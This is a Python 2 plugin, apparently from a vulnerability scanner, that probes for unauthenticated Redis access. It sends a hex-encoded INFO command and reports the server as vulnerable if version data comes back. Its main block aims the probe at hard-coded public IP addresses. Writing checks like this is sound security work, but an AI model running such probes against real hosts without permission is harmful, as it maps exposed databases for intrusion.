#!/usr/bin/env python
# encoding: utf-8
from t import T

import socket




class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):

        result = {}
        result['result']=False
        s=None


        try:

            payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
            s = socket.socket()
            socket.setdefaulttimeout(10)


            s.connect((ip, int(port)))
            s.send(payload)
            recvdata = s.recv(1024)
            if recvdata and 'redis_version' in recvdata:
                result['result'] = True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type'] = 'redis unauth access  vul'
                result['VerifyInfo']['URL'] = ip
                result['VerifyInfo']['Port'] = port
                result['VerifyInfo']['level'] = 'hole'
                result['VerifyInfo']['result'] = recvdata


        except Exception,e:
            print e.text
        finally:
            if s is not None:
                s.close()
            return result
if __name__ == '__main__':
    # print P().verify(ip='61.146.115.83',port='81')
    print P().verify(ip='121.41.28.130', port='7002')
